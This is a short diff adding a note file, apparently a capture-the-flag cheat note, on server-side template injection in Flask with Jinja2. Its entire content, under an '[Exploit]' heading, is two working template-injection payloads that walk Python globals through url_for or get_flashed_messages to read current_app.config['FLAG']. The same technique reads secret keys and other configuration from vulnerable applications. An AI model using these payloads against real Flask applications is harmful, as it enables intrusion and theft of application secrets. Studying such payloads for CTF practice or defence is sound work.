@@ -1,0 +1,9 @@
+flask SSTI by Jinja2 (Server Side Template Injection) 
+
+[Exploit】
+
+={{url_for.__globals__['current_app'].config['FLAG']}}
+
+or
+
+={{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
